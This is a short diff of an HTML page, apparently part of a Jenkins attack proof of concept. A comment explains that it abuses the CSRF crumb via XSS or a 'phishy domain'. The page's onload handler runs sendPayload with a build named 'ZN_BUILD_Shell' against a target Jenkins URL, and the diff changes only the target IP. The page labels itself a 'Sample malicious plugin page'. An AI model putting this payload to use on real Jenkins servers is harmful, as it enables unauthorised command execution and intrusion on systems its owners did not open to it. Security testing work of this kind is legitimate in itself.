@@ -3,7 +3,7 @@ getCrumb will work only under the same domain (so it must be used VIA XSS or oth
 So if you want to host script on some phishy domain, it will work only on jenkins without CSRF protection enabled 
 -->
 <html>
-  <body onload="sendPayload('ZN_BUILD_Shell','lol','http://192.168.100.6:8080')">
+  <body onload="sendPayload('ZN_BUILD_Shell','lol','http://192.168.0.14:8080')">
     <div>
       Sample malicious plugin page
       <p>Your crumb is:<div id="crumb"></div></p>
